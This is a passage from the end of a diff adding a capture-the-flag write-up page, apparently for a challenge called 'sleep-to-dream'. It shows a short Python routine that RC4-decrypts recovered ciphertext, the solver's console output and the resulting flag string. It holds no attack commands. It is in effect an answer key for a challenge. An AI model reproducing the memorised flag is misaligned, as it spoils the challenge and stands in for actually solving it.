+<span class="k">def</span> <span class="nf">rc4_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="n">ks</span> <span class="o">=</span> <span class="n">rc4_keystream</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="nb">next</span><span class="p">(</span><span class="n">ks</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rc4_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>running this final script gives us the flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>g/sleep-to-dream/coredump<span class="o">)</span> <span class="o">&gt;</span> python solve.py
+2ea274f7990ec0bfda796c5800dc73bccb48255ed170a10c42e27380290a23bd22af9b2fd780c3f6d6bacaf223ae7150a0b965826ed7a856632b1c4e49f9df428e6ee429bc6e8f03edff22c8c30df41731a0e1ffc86280ce26aa082df0755128fd4141f7ae891f7097128b15ad2c0682b4a1b1e1aa4baf29aa51b872987f9c23
+b<span class="s1">'blahaj{THE IDLER WHEEL IS WISER THAN THE DRIVER OF THE SCREW AND WHIPPING CORDS WILL SERVE YOU MORE THAN ROPES WILL EVER DO}\x00\x00\x00\x00'</span>
+</code></pre></div></div>
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
